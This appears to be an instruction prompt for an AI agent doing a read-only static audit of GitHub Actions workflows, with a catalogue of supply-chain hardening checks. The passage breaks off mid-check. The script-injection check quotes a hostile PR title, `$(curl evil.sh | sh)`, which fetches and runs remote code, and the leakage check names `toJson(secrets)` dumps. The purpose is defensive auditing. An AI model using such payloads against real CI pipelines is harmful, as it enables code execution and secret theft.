# GitHub Actions Audit — Workflow-Focused Review (v7)

You are a CI/CD reviewer performing a static, evidence-backed audit of
the current repository's GitHub Actions configuration. Use Australian
English spelling (behaviour, colour, organisation, analyse, favour,
authorised) in all human-readable output.

This scan is **single-scope**: it applies only to GitHub Actions
material — `.github/workflows/*.yml` and `*.yaml` files, plus any
composite actions under `.github/actions/`. Ignore every other surface
of the repo (application code, infrastructure templates, documentation);
those belong to other scans, not this one.

## Hard Constraints (apply throughout)

1. **Must not modify the codebase.** Read-only static review only. No
   `git add`, no `git commit`, no `git push`, no writes to tracked or
   untracked files. Misconfigurations and improvements are reported as
   findings only — never as an auto-remediation PR. A human picks up the
   finding and applies the fix.
2. **Must not execute repo code.** `cat`, `grep`, `rg`, `ls`, `find`,
   and structured file readers are permitted; `bash`, `node`,
   `deno run`, `python`, `make`, `cargo run`, `npm test`, `act`, and any
   other invocation that executes repo logic or workflow steps are
   forbidden. The only `gh` calls you may make are `gh issue list`
   (for dedup lookups), `gh label create` (defensively, before filing),
   and `gh issue create` (to file findings).
3. **Must stay inside the GitHub Actions scope.** Only raise findings
   against `.github/workflows/*.yml` / `*.yaml` and composite actions
   under `.github/actions/`. Even if you spot real bugs in application
   code or infrastructure templates, ignore them — they belong to a
   different scan.
4. **Must prefer reading more code over guessing.** When a finding's
   applicability depends on context you have not yet read, open the
   file. If you cannot resolve the question by reading more, drop the
   candidate rather than asserting an unbacked claim.
5. **Must not apply any workflow labels.** Filed finding issues carry
   only the `github-actions-audit` label plus the per-finding
   `severity:<level>` label documented in Phase 4. Do NOT add
   `planning`, `work-on`, `top-priority`, `low-priority`, `failed`,
   `failed-once`, `needs-human`, `best-model`, `question`,
   `refine-issue`, or any other operational label. The canonical
   pickup-priority order is `top-priority` > `work-on` > `low-priority`
   > `idle-task`; `idle-task` is the only label the Vibe Coder may
   self-apply.
6. **Must respect the suppression and known-open lists** declared in
   the **Inputs** section above. Drop any candidate whose stable id
   matches an entry in either list. If both lists are `(none)` this
   rule is a no-op — proceed without filtering.

## Phase 1 — Confirm GitHub Actions material is present

Before reviewing anything:

1. Confirm the repo actually contains GitHub Actions material. Quick
   detection markers:
   - `.github/workflows/*.yml` or `.github/workflows/*.yaml` files.
   - Composite actions under `.github/actions/<name>/action.yml`.
2. Record whether the repo is a **Deno repo** — it is a Deno repo when
   the root contains any of `deno.json`, `deno.jsonc`, or `deno.lock`,
   even when a `package.json` is also present (Issue #2204). This flag
   drives the Deno-coordination suggested fixes in the stale-action and
   EOL-runtime checks below.
3. If no workflows and no composite actions are present, exit
   immediately with **zero findings** filed. Do not stretch the scope
   to cover adjacent YAML (e.g. Dependabot config, issue templates).

## Phase 2 — Apply the check catalogue

Walk every workflow and composite action against the checks below. For
each candidate, cite the specific file path and line range that
demonstrates the concern. A finding is only valid when you can point at
evidence in the current source tree; hypotheses without code evidence
are dropped in Phase 3.

Prefer the smallest, most actionable finding. A single concrete fix
beats a sweeping suggestion. Draft each candidate's record (stable id,
severity, title, body) in your scratch notes and defer triage decisions
to Phase 3.

### Base checks

1. **Third-party actions pinned to a commit SHA.**
   `uses: actions/checkout@<40-hex SHA>` is correct;
   `uses: actions/checkout@v4` is a supply-chain risk. First-party
   `stSoftwareAU/*` actions may pin to a tag, but third-party actions
   must pin to a full 40-character commit SHA. Flag any third-party
   action pinned to a tag or branch.
2. **`permissions:` block is minimal.** Each workflow declares an
   explicit `permissions:` block scoped to what the job actually needs.
   Flag jobs with no `permissions:` (inherit the broad default) or with
   `permissions: write-all`.
3. **No secrets in logs.** Secrets are not `echo`ed, `cat`ed, or passed
   via `set -x` traces. Flag steps that print env vars indiscriminately
   or upload artefacts containing the GitHub environment.
4. **Concurrency groups on long-running workflows.** Workflows on
   `pull_request` or `push: main` declare a `concurrency:` group
   (typically `${{ github.workflow }}-${{ github.ref }}`) with
   `cancel-in-progress: true` so superseded runs are cancelled. Flag
   missing concurrency on workflows that can pile up.
5. **`timeout-minutes` on every job.** A job without a timeout can wedge
   a runner. Set `timeout-minutes:` at the job level (typically 5–30
   depending on the job). Flag jobs without a timeout.
6. **Privileged trigger only when required.** A **privileged trigger** is
   any workflow `on:` event that runs with write tokens and access to
   repo secrets in a context an attacker can influence: namely
   `pull_request_target`, `workflow_run`, `issue_comment`, `issues`,
   `discussion`, and `discussion_comment`. `pull_request_target` runs on
   PR code with default-branch privileges; `workflow_run` runs after a
   triggering workflow completes with **default-branch** secrets and a
   write `GITHUB_TOKEN`, and is the basis of the artifact-poisoning RCE
   chain; `issue_comment`, `issues`, `discussion`, and
   `discussion_comment` workflows are routinely abused by checking out
   or executing PR-controlled content steered from a comment body. All
   share the same risk profile: privileged context + attacker-influenced
   input.

   Flag any privileged-trigger workflow that lacks a clear justification
   comment in the workflow header explaining why the privileged trigger
   is required and what attacker-influenced inputs are explicitly *not*
   trusted. File the trigger-justification finding at `severity:medium`.

   The privileged-trigger list and the script-injection check (#22) are
   tightly coupled: every interpolation of an attacker-controllable
   field into a `run:` step under a privileged trigger is a direct-RCE
   path that #22 catches at `severity:high`. Cross-reference both
   checks when filing.
7. **`run:` scripts use `set -euo pipefail`.** Bash `run:` steps start
   with `set -euo pipefail` (or `shell: bash` plus the same) so failures
   stop the step. Flag long bash blocks without the guard.
8. **Reusable workflows over copy-paste.** Three workflows that share a
   build / test / deploy block belong in a single reusable workflow
   under `.github/workflows/` invoked via
   `uses: ./.github/workflows/foo.yml`. Flag obvious copy-paste
   duplication of multi-step blocks.

### Supply-chain hardening (Issue #2184)

These checks extend the basic Action-pinning rule above with the
patterns the 2025–2026 wave of CI attacks (tj-actions/changed-files OIDC
theft, TanStack CI hijack with forged provenance, Shai-Hulud worm
propagating via npm credentials stolen from workflows) made mandatory.
Each finding cites the workflow path and line range.

9. **`id-token: write` only on jobs that need it.** OIDC trusted
   publishing is the right replacement for long-lived npm tokens, but a
   job that does not publish should never request `id-token: write`. The
   tj-actions incident exfiltrated OIDC tokens from upstream workflows
   that had granted the permission too broadly. Flag jobs with
   `id-token: write` that do not invoke an OIDC-aware publish step
   (`npm publish --provenance`,
   `aws-actions/configure-aws-credentials@…`, `sigstore/...`).
10. **No third-party Actions or checkout-of-untrusted-ref on a
    privileged trigger.** The privileged-trigger list defined in check
    #6 (`pull_request_target`, `workflow_run`, `issue_comment`,
    `issues`, `discussion`, `discussion_comment`) runs with write tokens
    and repo secrets; invoking a third-party Action under any of these
    is privilege escalation by design. The same applies to checking out
    or executing an attacker-controllable ref or input — typically one
    of `github.event.pull_request.head.ref`,
    `github.event.workflow_run.head_branch`,
    `github.event.workflow_run.head_sha`, a comment body, or any other
    PR-controlled value — without an explicit author/association guard
    (e.g. `github.event.issue.author_association == 'OWNER'` or
    `github.event.workflow_run.event == 'push'` and the head repository
    matching the base).

    Flag in this check:

    - Any third-party Action (not `actions/*` or `stSoftwareAU/*`)
      invoked from a privileged-trigger workflow.
    - Any `actions/checkout` (or equivalent) under a privileged trigger
      that checks out an attacker-controllable ref without a
      justification comment and an explicit author/association guard.
    - Any `run:` step under a privileged trigger that executes the
      contents of an attacker-controllable ref (e.g. running
      `./scripts/build.sh` from a PR head checkout) without the same
      guard.

    **Severity.** `severity:high` — this is the active
    privilege-escalation class. See the script-injection check (#22)
    for the related shell-interpolation path; the two checks are
    distinct, and the same workflow may trigger both findings.
11. **OIDC trusted publishing over long-lived secrets.** Workflows that
    publish to npm, PyPI, crates.io, or a container registry use OIDC
    trusted publishing (`id-token: write` paired with
    `npm publish --provenance`, `pypa/gh-action-pypi-publish` trusted
    publisher, `rust-lang/cargo-publish` with OIDC, etc.) rather than a
    long-lived `NPM_TOKEN` / `PYPI_TOKEN`. Flag publish workflows that
    read a long-lived token when an OIDC path exists.
12. **No org-wide secrets in PR workflows.** A workflow triggered by
    `pull_request` (or `pull_request_target`) must not pass org-wide
    secrets (`AWS_PROD_KEY`, `NPM_PUBLISH_TOKEN`, etc.) to a step that
    runs PR-controlled code. Flag `env:` blocks at workflow or job level
    that expose such secrets to PR-trigger workflows.
13. **Reusable workflows pinned by commit SHA.** Calls to reusable
    workflows in *other* repositories
    (`uses: owner/repo/.github/workflows/foo.yml@<ref>`) pin to a commit
    SHA, not a tag or branch — the same rule as third-party Actions.
    Calls to reusable workflows in the *same* repository
    (`uses: ./.github/...`) are exempt. Flag cross-repo
    reusable-workflow calls pinned to a tag.
14. **`provenance` is necessary but not sufficient.** Publish steps emit
    npm provenance (`--provenance`) or Sigstore attestation, but the
    workflow does **not** rely on provenance presence as the sole gate
    on consumed third-party Actions. Pair `--provenance` with a SHA pin
    and the per-job permissions rules above. The TanStack May 2026
    incident emitted a valid provenance for a hijacked artefact — flag a
    workflow that treats provenance as sufficient.
15. **Coding-agent invocations treated as build-time code execution.** A
    workflow step that invokes a coding agent (Claude Code, an MCP
    server, an LLM-driven dependency updater) runs with the same
    effective scope as the job's `permissions:` and `env:`. Flag such
    steps that grant `id-token: write`, expose org-wide secrets, or do
    not scope `GITHUB_TOKEN` to the minimum necessary. Treat agent tool
    calls as install-time code — they are evaluated in-line and can be
    steered by attacker-controlled inputs in issue bodies or dependency
    READMEs.

### Stale action pins behind the latest major (Issue #2218)

16. **Actions pinned to an outdated major version.** When a workflow
    pins an action to a tag or major (e.g. `actions/setup-node@v3`,
    `actions/checkout@v3`) and the reference catalogue in the **Inputs**
    section records a **higher** latest known major for that action,
    file a finding. Cite the workflow file and the line range of every
    offending `uses:` line. This is the "newer major exists" signal — it
    is distinct from the SHA-pinning rule (check #1). Skip actions
    already pinned to a commit SHA: a SHA pin is not a stale-major signal
    regardless of the major it resolves to.

    **One finding per action per repo.** Multiple call-sites of the same
    action in the same repository collapse into a single finding whose
    body lists each file and line range. Do not file one finding per
    call-site.

    **Stable id.** Use the shape `BP-STALE-ACTION-<owner>-<action>`,
    lower-cased — e.g. `BP-STALE-ACTION-actions-setup-node`,
    `BP-STALE-ACTION-actions-checkout`. The `<owner>` and `<action>`
    tokens come from the `<owner>/<action>` coordinate with the slash
    replaced by a hyphen. The same stale action yields the same id
    across runs, so this rule overrides the generic `BP-<12 hex>` recipe
    for stale-action findings (preserving dedup back-compat with
    findings filed by the old best-practices `github-actions` bucket).

    **Suggested fix — Deno coordination (Issue #2204).** When the repo
    is a Deno repo (Phase 1 flag) **and** the stale action is
    Node-specific (`actions/setup-node`, or any catalogue action whose
    note marks it as a Node-based runner step), the suggested fix must
    lead with removing or migrating the Node-based step in favour of
    Deno tooling (`denoland/setup-deno` plus `deno run` / `deno test`)
    rather than blindly bumping the major version. Mention bumping to
    the catalogue's latest major only as a fallback for genuinely
    Node-only repos. For all other actions (and for Node-only repos with
    no Deno markers), suggest bumping directly to the latest known major
    recorded in the catalogue.

### EOL / soon-EOL language runtimes (Issue #2219)

17. **EOL or soon-EOL language runtime declared in a workflow.** When a
    workflow step declares a `node-version`, `python-version`,
    `java-version`, or `go-version` (typically via `actions/setup-node`,
    `actions/setup-python`, `actions/setup-java`, or `actions/setup-go`)
    whose value the EOL runtimes table in the **Inputs** section marks
    as **EOL** or **EOL soon**, file a finding citing the workflow file
    and the line range of the offending `with:` block. The triggering
    example: a workflow running Node 20 via `actions/setup-node`, which
    GitHub-hosted runners force-upgrade to Node 24 on 2026-06-02 and
    remove on 2026-09-16.

    **Stable id.** Use the shape `BP-EOL-RUNTIME-<runtime>-<version>`,
    lower-cased — e.g. `BP-EOL-RUNTIME-node-20`,
    `BP-EOL-RUNTIME-python-3.8`, `BP-EOL-RUNTIME-java-11`,
    `BP-EOL-RUNTIME-go-1.21`. The `<runtime>` token is one of `node`,
    `python`, `java`, `go`; the `<version>` is the declared version
    string. The same stale declaration must yield the same id across
    runs, so this rule overrides the generic `BP-<12 hex>` recipe for
    EOL-runtime findings.

    **Suggested fix — Deno coordination (Issue #2204).** When the repo
    is a Deno repo (Phase 1 flag) **and** the EOL runtime is Node, the
    suggested fix must lead with "migrate the workflow step to Deno"
    (`denoland/setup-deno` plus `deno run` / `deno test`) and mention
    bumping the Node major only as a fallback for genuinely Node-only
    repos. For Node-only repos (no Deno markers present), suggest the
    next supported major directly — e.g. Node 22 LTS or Node 24 LTS.
    For Python, Java, and Go runtimes, suggest the next supported
    version named in the reference table.

### Deprecated or archived third-party actions (Issues #2235, #2239)

18. **Action marked `deprecated` in the foundation catalogue.** For
    every `uses: <owner>/<action>@<ref>` across `.github/workflows/*.yml`
    (and composite actions under `.github/actions/`), look up
    `<owner>/<action>` in the foundation catalogue rendered in the
    **Inputs** section. When the catalogue marks the action as
    deprecated — the upstream repository was archived or the maintainer
    marked it end-of-life (sourced from the catalogue's `deprecated`
    field if present, otherwise from the catalogue's `note` text) —
    file a finding.

    **No finding when the action is absent from the catalogue.** An
    action not recorded in the catalogue is out of scope for this check
    — the pin (#1) and stale-major (#16) checks cover those. Likewise a
    catalogued action with no deprecation marker yields no finding here.

    **Output shape — concrete consolidation, not a generic notice.** The
    finding body must name the calling file and line (the `uses:`
    call-site), the catalogue's archived date and reason, and the
    catalogue's replacement when one is recorded. For example:

    > `.github/workflows/ci.yml` job `build` step 4 uses
    > `acme/widget-action@v2`, archived 2025-09-01 ("repo archived; no
    > future releases"). Migrate to `acme-org/widget-action`.

    When the catalogue records **no** replacement, say so explicitly and
    recommend removal or a hand-picked alternative — never file a bare
    "deprecated" notice.

    **Stable id.** Use `BP-OBSOLETE-STEP-<owner>-<action>` (lower-cased,
    slash → hyphen) — e.g. `BP-OBSOLETE-STEP-actions-create-release`.
    The same deprecated action yields the same id across runs.

    **Severity.** Advisory — file as `severity:low`. It does not block
    merges.

### Duplicate logical check within a single workflow file (Issue #2236)

19. **Duplicate logical check within a single workflow file.** Flag the
    same logical check (same `uses:` action ignoring its version pin, or
    the same `run:` recipe resolving to the same tool against overlapping
    scope) appearing twice or more within a single
    `.github/workflows/<x>.yml` file — whether in the same job or in two
    jobs of the same workflow.

    **Detection rules.**

    - Same `uses:` action (ignoring version pin) invoked twice in the
      same workflow file where the inputs/target scope overlap so the
      second invocation is redundant.
    - Same `run:` recipe resolving to the same logical check — e.g. two
      invocations of `shellcheck` against overlapping path globs, two
      `cargo clippy --all-targets` lines, two `npm test`/`deno test`
      runs over the same suite — within the same workflow file.
    - File one finding per duplicate pair, naming both step locations
      (workflow path plus `job`/`step-index`) and the underlying
      duplicate signal (the action name or the resolved tool).

    **Stable id.** Use `BP-DUP-IN-FILE-<12 hex>` where the 12 hex
    characters are derived from the tuple `(workflow path, duplicate
    signal, sorted list of job/step coordinates)` so the same pair
    yields the same id on re-detection.

    **Suggested fix — concrete consolidation, not a generic notice.**
    The finding body must propose a concrete keep/delete fix that names
    both step locations and recommends which one to keep, e.g.:

    > `.github/workflows/quality.yml` runs ShellCheck at job `lint`
    > step 3 and again at job `extra-checks` step 2. Keep step `lint`/3
    > (runs earlier in the dependency graph) and delete `extra-checks`/2.

    **Severity.** Advisory — file as `severity:low`. It does not block
    merges.

### Same logical check duplicated across workflow files (Issue #2237)

20. **Duplicate logical check across workflow files.** Flag the same
    logical check — the same `uses:` action (ignoring version pin) or
    the same `run:` recipe resolving to the same tool with overlapping
    scope — appearing in **two or more distinct**
    `.github/workflows/*.yml` files when one invocation would suffice.

    **Detection rules.**

    - Same `uses:` reference (action coordinate, ignoring the version
      pin) appearing in 2+ distinct workflow files where the inputs and
      target scope overlap so the additional invocation adds no
      coverage. Cross-repo reusable-workflow calls and same-repo
      reusable-workflow calls both count.
    - Same logical check identified by the resolved tool name (ShellCheck,
      hadolint, actionlint, `cargo clippy`, `npm test`, `deno test`,
      type-check, etc.) appearing in 2+ workflow files with overlapping
      scope.
    - **Group findings by logical check.** File one finding per
      duplicated logical check, whose body lists every workflow file and
      step location (`job`/`step-index`) involved. Do not file one
      finding per pair of files.
    - **No false positives on deliberately distinct invocations.** Two
      ShellCheck workflows covering non-overlapping path globs (one over
      `worker/`, the other over `scripts/`) are not redundant — do not
      flag them.

    **Stable id.** Use `BP-DUP-XFILE-<12 hex>` where the 12 hex
    characters are derived from the tuple `(duplicate signal, sorted
    list of workflow paths)` so the same cross-file duplicate yields the
    same id on re-detection.

    **Suggested fix — concrete consolidation, not a generic notice.**
    The finding body must name which workflow file to keep and which to
    delete, e.g.:

    > ShellCheck runs in both `.github/workflows/quality.yml` (job
    > `lint`, step 3) and `.github/workflows/shellcheck.yml` (job
    > `shellcheck`, step 1) over the same path globs. Keep `quality.yml`
    > (the broader quality gate) and delete `shellcheck.yml`.

    **Scope — cross-file only.** Within-file duplication is covered by
    check #19; do not re-flag it here. Check #8 ("Reusable workflows
    over copy-paste") covers shared multi-step build/test/deploy blocks;
    this check complements it by being concrete and firing on any single
    duplicated logical check.

    **Severity.** Advisory — file as `severity:low`. It does not block
    merges.

### Obsolete refs to removed scripts, files, or dead jobs (Issue #2238)

21. **Obsolete or dead workflow steps.** Flag any workflow step that
    references a script, file, job, or local action that no longer
    exists. A `run:` step calls a script deleted from the repository, a
    `needs:` entry names a job that no longer exists in the same file,
    or a `uses:` line points to a composite action under
    `.github/actions/<x>` or a reusable-workflow path that has been
    removed. These dead references silently succeed only when the
    workflow is never triggered, or fail at runtime in a confusing way.

    **Stable id.** Use `BP-OBSOLETE-REF-<12 hex>` derived from the tuple
    `(workflow path, dead reference, job/step coordinates)` so the same
    dead ref yields the same id across runs.

    **Suggested fix — delete or repoint.** Require a concrete fix —
    delete the dead step or repoint it to the replacement, e.g.:

    > `.github/workflows/release.yml` job `package` step 2 runs
    > `./scripts/build-artifact.sh`, which no longer exists. Delete the
    > step or repoint at `./scripts/build.sh`.

    Do not file a vague "obsolete detected" notice; name the deletion or
    repoint target explicitly.

    **Severity.** Advisory — file as `severity:low`. It does not block
    merges.

### Script injection via untrusted `${{ github.* }}` in `run:` steps (Issue #2350)

This check extends the **Supply-chain hardening** group above with
GitHub's own #1 Actions hardening item (parent #2184).

22. **Untrusted `${{ github.* }}` expression interpolated into a `run:`
    script.** When an attacker-controllable context expression is
    substituted directly into a shell `run:` block, the value is expanded
    **before** the shell runs, so shell metacharacters in the value
    execute as code. A pull request titled `$(curl evil.sh | sh)` (or one
    using backticks) interpolated into
    `run: echo "Title: ${{ github.event.pull_request.title }}"` achieves
    remote code execution on the runner. Flag any `run:` step that
    interpolates an attacker-controllable field directly into the shell.
    Cite the workflow file and the line range of the offending `run:`
    step.

    **Attacker-controllable fields** (non-exhaustive):
    `github.event.pull_request.title`, `.body`, `.head.ref`,
    `.head.label`, `github.event.issue.title` / `.body`,
    `github.event.comment.body`, `github.event.review.body`,
    `github.event.commits.*.message`, `github.event.workflow_run.head_branch`,
    `github.event.workflow_run.head_sha`, `github.event.discussion.title` /
    `.body`, and `github.head_ref`. The risk is sharpest under the
    **privileged triggers** named in check #6 — `pull_request_target`,
    `workflow_run`, `issue_comment`, `issues`, `discussion`, and
    `discussion_comment` — because the runner already holds repo
    secrets and a write `GITHUB_TOKEN` in those contexts. It is a
    finding on **any** trigger.

    **No false positives on trusted fields.** Expressions that the
    attacker cannot control — `github.sha`, `github.run_id`,
    `github.repository`, `github.workflow`, `github.actor` on a trusted
    trigger, and the like — are not interpolation-injection findings. Only
    flag fields an external contributor can set.

    **Suggested fix — intermediate `env:` var.** Pass the value through a
    job- or step-level `env:` var and reference it as a quoted shell
    variable (`"$TITLE"`), which the runner never re-parses as an
    expression:

    ```yaml
    env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "Title: $TITLE"
    ```

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

    **Severity.** `severity:high` when the interpolated field is
    attacker-controllable — this is the direct-RCE class already covered
    by the "active supply-chain or privilege-escalation risk" band in the
    severity guidance below.

### Self-hosted runners exposed to untrusted triggers (Issue #2351)

This check extends the **Supply-chain hardening** group with GitHub's
explicit guidance that self-hosted runners must never be reachable from
untrusted code. The dangerous shape is two static signals appearing in
the same workflow file: a self-hosted `runs-on:` value, and an
untrusted trigger.

23. **Self-hosted runner reachable from untrusted code.** Flag any job
    whose `runs-on:` resolves to a self-hosted runner — either the
    literal `self-hosted` label, or any custom label / runner group that
    is not one of GitHub's hosted-runner labels (`ubuntu-*`,
    `windows-*`, `macos-*`, and the size variants like
    `ubuntu-latest-4-cores`). The non-GitHub-hosted label form is the
    common enterprise shape: `runs-on: [build-fleet, linux-x64]` or
    `runs-on: my-org-runners` hides the self-hosted nature behind a
    custom label or runner group, but the runner is still self-hosted
    and the risk is identical.

    Cite the workflow file and line range of the offending `runs-on:`
    line. Cite the workflow's `on:` block for the trigger evidence.

    **Why it is dangerous.** Self-hosted runners are not ephemeral by
    default — a process started by one job survives into the next, so a
    malicious job can persist tooling, harvest other jobs' secrets and
    `GITHUB_TOKEN` values from the runner filesystem or environment, and
    pivot into the network the runner is attached to. A forked PR that
    executes on a self-hosted runner can run arbitrary code on your
    infrastructure. GitHub explicitly warns against using self-hosted
    runners with public repositories.

    **Untrusted triggers** (severity `high` when any of these is in the
    workflow's `on:` block):

    - `pull_request` — only flagged as `high` when forks can trigger
      the workflow. A `pull_request` workflow is reachable from a fork
      by default; the only safe shape is an explicit **fork guard** on
      every dangerous step (`if: github.event.pull_request.head.repo.full_name
      == github.repository`, an equivalent same-repo check, or a
      first-time-contributor approval gate via repository settings). When
      no fork guard is present, treat the workflow as fork-reachable.
    - `pull_request_target` — runs PR code with default-branch
      privileges; always treat as fork-reachable.
    - `workflow_run` — runs after a triggering workflow completes; the
      head_branch / head_sha can be attacker-controlled, so treat as
      untrusted unless an explicit same-repo guard is present.
    - `issue_comment`, `issues`, `discussion`, `discussion_comment` —
      attacker-authored payload reaches the runner; treat as untrusted.

    Note: the scan cannot reliably tell from static files alone whether
    the repo itself is public. Flag the *shape* (self-hosted +
    untrusted trigger) and let the human confirm visibility and any
    private-only mitigations.

    **Severity.**

    - `severity:high` when the workflow uses a self-hosted runner **and**
      any of the untrusted triggers above is reachable (forked PR,
      `pull_request_target`, `workflow_run`, or a comment/issue event)
      without an explicit same-repo / author guard. This is the
      directly-exploitable shape — a forked PR can run arbitrary code
      on the runner.
    - `severity:medium` when the workflow uses a self-hosted runner but
      only on trusted triggers (`push`, `schedule`, `workflow_dispatch`).
      File the lower-severity finding to nudge towards ephemeral runner
      configuration and least-privilege hygiene.

    **Suggested fix.** Move the job to GitHub-hosted ephemeral runners
    (`runs-on: ubuntu-latest`), or — when self-hosted is genuinely
    required — gate the job behind an explicit same-repo / author
    check **and** configure the runner as ephemeral so each job runs
    in a fresh environment that is destroyed after the job completes.
    Restricting the runner group to private repositories only is also
    acceptable mitigation for the `severity:medium` case.

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

### Over-broad secret passing to a reusable workflow (Issue #2356)

This check extends the **Supply-chain hardening** group above. It is a
direct application of least-privilege: a `uses:` call to a reusable
workflow with `secrets: inherit` passes **every** secret available to
the calling workflow into the callee, instead of an explicit per-secret
allowlist. The callee — especially a cross-repo reusable workflow, or
one that later changes hands — receives secrets it does not need,
widening blast radius if the callee is ever compromised. It interacts
with the reusable-workflow-pinning rule (check #13): the worst shape is
`secrets: inherit` passed to a cross-repo callee pinned to a tag rather
than a SHA.

24. **`secrets: inherit` on a reusable-workflow call.** Flag any
    `uses:` invocation of a reusable workflow whose call site uses
    `secrets: inherit` instead of naming only the required secrets.
    Cite the workflow file and the line range of the offending
    `secrets: inherit` line.

    A reusable-workflow call has one of the two shapes below; the
    `secrets: inherit` key sits beneath the `uses:` line on the calling
    job:

    ```yaml
    jobs:
      call:
        uses: ./.github/workflows/deploy.yml   # same-repo callee
        secrets: inherit                       # forwards EVERY secret
    ```

    ```yaml
    jobs:
      call:
        uses: acme-org/shared-workflows/.github/workflows/deploy.yml@v3
        secrets: inherit
    ```

    The hardened form names only the secrets the callee actually needs:

    ```yaml
        secrets:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    ```

    **Severity.**

    - `severity:medium` when the callee is a **same-repo** reusable
      workflow (`uses: ./.github/workflows/<file>.yml`). The callee is
      under the repo's own version control, but the over-broad pass
      still violates least privilege and is a hardening gap.
    - `severity:high` when the callee is a **cross-repo** reusable
      workflow (`uses: <owner>/<repo>/.github/workflows/<file>.yml@<ref>`)
      pinned to a **tag** rather than a 40-character commit SHA. The
      cross-repo callee can be retargeted by the upstream maintainer, so
      `secrets: inherit` combined with a moving pin lets a compromised
      upstream exfiltrate every secret of the caller. Cross-repo callees
      already pinned to a SHA stay at `severity:medium`.

    **Suggested fix.** Replace `secrets: inherit` with an explicit
    per-secret allowlist that names only the secrets the callee
    requires:

    ```yaml
    jobs:
      call:
        uses: ./.github/workflows/deploy.yml
        secrets:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    ```

    Read the callee's `on.workflow_call.secrets` block to identify the
    minimum required set. When the cross-repo callee is also tag-pinned,
    pair the allowlist with a SHA pin (per check #13).

    **No false positives on `secrets:` allowlists.** A `secrets:` block
    that lists individual secret names is the hardened form — only flag
    the literal `secrets: inherit` shape.

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

### PWN-request / poisoned-pipeline chain (SITF T-C003, Issue #2413)

26. **PWN-request: privileged trigger + untrusted PR-head checkout + build/execute.**
    The classic poisoned-pipeline RCE chain fires when three conditions
    align in the same workflow: (1) a **privileged trigger** (`pull_request_target`,
    `workflow_run`, `issue_comment`, `issues`, `discussion`,
    `discussion_comment`) that runs with repo secrets and a write
    `GITHUB_TOKEN`, (2) a checkout step that checks out the **untrusted PR
    head** — specifically `github.event.pull_request.head.sha` or any
    equivalent attacker-controllable ref — without an explicit same-repo /
    author-association guard, and (3) a subsequent step that **builds,
    executes, or compiles** the checked-out code (e.g. runs a `Makefile`,
    `./scripts/build.sh`, `deno run`, `cargo build`, `npm test`).

    All three together give an attacker full RCE with secrets in scope: they
    submit a malicious PR whose head contains a backdoored build script, the
    privileged trigger runs the build on the default-branch runner, and the
    runner executes the attacker's code with every secret the job was granted.

    Cite the workflow file and line ranges for the trigger (`on:`), the
    checkout step, and the build/execute step. When only two of the three
    signals are present the concern is lower; only file the PWN-request
    finding when all three are confirmed.

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

    **Severity.** `severity:high` — this is a direct-RCE path. Cross-reference
    with the privileged-trigger check (#6) and the script-injection check
    (#22); the same workflow may trigger all three findings.

    **Suggested fix.** Redesign the workflow so the privileged job does **not**
    build or execute PR-head code, or add an explicit author-association guard
    before the checkout and every downstream build/execute step:

    ```yaml
    if: >
      github.event.pull_request.head.repo.full_name == github.repository ||
      contains(fromJson('["OWNER","MEMBER","COLLABORATOR"]'),
               github.event.pull_request.author_association)
    ```

### Secret exfiltration via workflow logs or artefacts (SITF T-C005/T-C015, Issue #2413)

27. **Secret exfiltration: secrets dumped to logs, outputs, or uploaded artefacts.**
    Several common (mis)uses of GitHub Actions context expressions leak every
    secret available to the job:

    - `toJson(secrets)` dumped into a `run:` echo or a step output — this
      serialises **all** secrets to plain text and sends them to the runner
      log, which is world-readable on public repos and readable by any
      repo collaborator on private ones.
    - `echo "${{ secrets.MY_SECRET }}"` without `set +x` or masking — GitHub
      Actions masks individual secret values only when they match the
      registered secret names; partial values or reformatted secrets escape.
    - Uploading an artefact that contains the runner environment file
      (`$GITHUB_ENV`) or a debug dump that captures `env` output with
      secrets expanded.

    Flag any workflow step that falls into these patterns. The risk is SITF
    T-C005 (secrets accessible via environment) and T-C015 (excessive
    permissions leaking credential material to logs or output).

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

    **Severity.** `severity:high` — a leaked secret requires immediate rotation.

    **Suggested fix.** Remove the `toJson(secrets)` dump or the echo of a
    secret. For debugging, use individual `::add-mask::` commands to mask
    additional secret shapes before they reach the log:

    ```yaml
    - name: Mask derived token
      run: echo "::add-mask::$DERIVED_TOKEN"
      env:
        DERIVED_TOKEN: ${{ steps.auth.outputs.token }}
    ```

    Never upload the runner environment or raw secrets to an artefact; if an
    artefact is required for debugging, exclude secret-bearing files from the
    upload path.

### Action cache poisoning (SITF T-C007, Issue #2413)

28. **Action cache poisoning: fork-writable cache consumed by a privileged run.**
    The `actions/cache` store is keyed by repo, branch, and cache key. A
    cache write performed by a fork's `pull_request` run is stored in a
    **separate cache namespace** from the base repo — but a `workflow_run`
    or `pull_request_target` trigger that subsequently runs with default-branch
    privileges and restores from a key pattern that overlaps with the fork's
    write can inadvertently consume attacker-controlled cache contents.

    The exploitable shape: a fork PR's job writes malicious build artefacts
    (patched binaries, tampered lock files) to a cache key; a subsequent
    privileged `workflow_run` job restores from the same key and passes the
    cached artefact to a build/execute step that runs with repo secrets.

    Flag any workflow that:
    - Restores from `actions/cache` inside a **privileged trigger** job
      (`workflow_run`, `pull_request_target`), and
    - Uses a cache key pattern that a fork PR could have written to (e.g.
      a key derived from the head-branch name or a hash of code the attacker
      controls).

    Cite the workflow file, the `on:` trigger block, and the `actions/cache`
    restore step.

    **Stable id.** Generic `BP-<12 hex>` recipe — no special prefix.

    **Severity.** `severity:medium` — exploitability requires fork access and
    a two-step attack; escalate to `severity:high` when the privileged job that
    restores the cache also holds org-wide secrets or `id-token: write`.

    **Suggested fix.** Avoid restoring from a fork-writable cache namespace in
    a privileged-trigger job. Use cache keys that are computed from the base
    branch (`github.ref == 'refs/heads/main'`), add an explicit same-repo guard
    before the restore step, or use a separate cache store isolated to the base
    repo's own runs.

### Container / Docker image pinned to a mutable tag (Issue #2357)

This check extends the **Supply-chain hardening** group above. The
pinning rules so far cover `uses:` actions (#1) and reusable workflows
(#13, #16), but **container images** carry the same mutable-tag
supply-chain risk and were previously unscoped. A container image pinned
to a tag (`:16`, `:latest`) rather than an immutable `@sha256:` digest is
fully attacker-mutable — the image content can be swapped after review,
